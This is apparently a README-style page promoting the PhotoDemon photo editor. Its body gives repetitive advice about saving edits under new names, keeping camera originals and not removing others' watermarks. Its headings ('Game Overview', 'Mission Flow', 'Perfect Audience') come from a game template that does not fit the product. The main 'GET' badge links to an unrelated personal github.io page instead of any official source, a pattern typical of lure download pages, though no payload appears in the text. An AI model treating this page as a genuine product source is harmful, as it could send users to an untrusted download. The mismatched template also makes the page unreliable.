# PhotoDemon - Edit a Photo You Took

[![GET PhotoDemon](https://img.shields.io/badge/GET%20%E2%80%94%20PhotoDemon-334155?style=for-the-badge&logoColor=white)](https://maryamsoniaa223.github.io/.github/photodemon-layers)

## Game Overview

PhotoDemon edits pictures you took or were allowed to change: a crop, a level, a resize. Save a new file. The camera original stays until you decide you do not need it. It does not include a stock library, and it does not remove a watermark from an image you do not own.

Work on a copy if this frame is the only one. A save that uses the same name as the original is how the shot disappears. Open the new file in a normal viewer and look at it at actual size before you delete anything. Fit-to-window can hide a bad crop.

## Play Your Way

A one-step edit is a crop or a rotate, saved as a new JPEG. That teaches the save dialog. Read the name. If it matches the original, change it. Then look at the JPEG outside PhotoDemon.

A heavier edit, such as several adjustments, still ends in a new file. If the result is too dark, change it and save another name. You do not need to reshoot unless the capture itself was unusable. Keep the card or the raw until the computer copy has opened and the export is the one you want.

## Mission Flow

Open one photo from a folder you copied off the card, not from the only card if you can avoid it. Crop or adjust. Save As with a name that says it is the edit.

View that file at actual size. Check the edges of the crop. If a tool asked you to flatten or overwrite, cancel until you see a new name. Delete nothing from the card in the same sitting. A watermark you did not put there is a reason to close the file, not a filter to hunt.

## Perfect Audience

PhotoDemon fits a crop you need before you send a picture you took, and a small correction when a full raw developer is more than the job. The JPEG you export is what other people see.

It does not fit an image you do not own, and it is the wrong place to scrub a mark you did not create. Keep the original until the new file looks right at actual size.

## Common Issues

The original changed only if you saved over it. Restore from the copy you should have made, and use Save As next time. A soft result is often a heavy resize. Check actual size. If the program cannot open the file, it may not be a picture you think it is, or it may be a raw that belongs in a raw developer. Do not convert the only copy to find out.

## Extended Notes

Keep the card until the folder on the computer has opened. Name exports so the date or the word "edit" is obvious. A batch of edits can wait until one file has gone out and back in a viewer. If you are unsure you may change the picture, do not open it in an editor.
